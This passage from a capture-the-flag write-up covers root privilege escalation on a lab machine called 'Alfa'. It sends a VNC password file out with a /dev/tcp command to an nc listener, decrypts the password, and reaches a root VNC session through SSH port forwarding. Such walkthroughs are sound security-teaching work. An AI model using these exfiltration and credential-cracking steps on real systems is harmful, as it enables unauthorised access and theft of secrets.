</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>In thomas&rsquo;s home directory,  there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> thomas thomas <span class="m">4096</span> dic <span class="m">20</span> 22:22 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root   root   <span class="m">4096</span> dic <span class="m">16</span> 07:58 ..
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> thomas thomas    <span class="m">4</span> dic <span class="m">20</span> 22:22 .bash_history
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">220</span> dic <span class="m">16</span> 07:58 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">3526</span> dic <span class="m">16</span> 07:58 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 21:15 .gnupg
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 20:44 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">807</span> dic <span class="m">16</span> 07:58 .profile
</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> root   root     <span class="m">16</span> dic <span class="m">17</span> 23:35 .remote_secret
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
</span></span></code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ cat .remote_secret 
</span></span><span class="line"><span class="cl">�<span class="s2">&#34;�Cc�&#34;</span>�Cc
</span></span></code></pre></div><p>Running <a href="https://github.com/DominicBreuker/pspy">pspy</a> discovers a VNC server running locally with root access on port 5901.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</span></span></code></pre></div><h4 id="vnc-decrypt">VNC Decrypt</h4>
<p>This <code>.remote_secret</code> is a VNC password file and I could use <a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password">HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p>
<p>On Alfa:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; remote_secret
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.2.103<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.109<span class="o">]</span> <span class="m">57532</span>
</span></span></code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ./vncpwd remote_secret 
</span></span><span class="line"><span class="cl">Password: k!LL3rSs
</span></span></code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. The next option here is to access the VNC server using this password.</p>
<h4 id="accessing-vnc">Accessing VNC</h4>
<p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p>
<p>On thomas&rsquo;s session</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thomas@Alfa:~$ ~C
</span></span><span class="line"><span class="cl">ssh&gt; -L 5901:localhost:5901 
</span></span><span class="line"><span class="cl">Forwarding port.
</span></span></code></pre></div><p>That will create a tunnel from my Kali localhost:5901 =&gt; Alfa&rsquo;s localhost:5901</p>
<p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and supply the <code>remote_secret</code> file to <code>-password</code> option.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103»  
</span></span><span class="line"><span class="cl">$ vncviewer -passwd remote_secret 127.0.0.1:5901
</span></span><span class="line"><span class="cl">Connected to RFB server, using protocol version 3.8
</span></span><span class="line"><span class="cl">Performing standard VNC authentication
</span></span><span class="line"><span class="cl">Authentication successful
</span></span><span class="line"><span class="cl">Desktop name <span class="s2">&#34;Alfa:1 (root)&#34;</span>
</span></span><span class="line"><span class="cl">VNC server default format:
</span></span><span class="line"><span class="cl">  <span class="m">32</span> bits per pixel.
</span></span><span class="line"><span class="cl">  Least significant byte first in each pixel.
</span></span><span class="line"><span class="cl">  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
</span></span><span class="line"><span class="cl">Using default colormap which is TrueColor.  Pixel format:
</span></span><span class="line"><span class="cl">  <span class="m">32</span> bits per pixel.
</span></span><span class="line"><span class="cl">  Least significant byte first in each pixel.
</span></span><span class="line"><span class="cl">  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
</span></span><span class="line"><span class="cl">Same machine: preferring raw encoding
</span></span></code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p>
<p><div class="img-container"><img src="imgs/image-20210422160633799.png" alt="image-20210422160633799"  /></div>
</p>
<p>To be honest, this is actually guessing.</p>
<p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
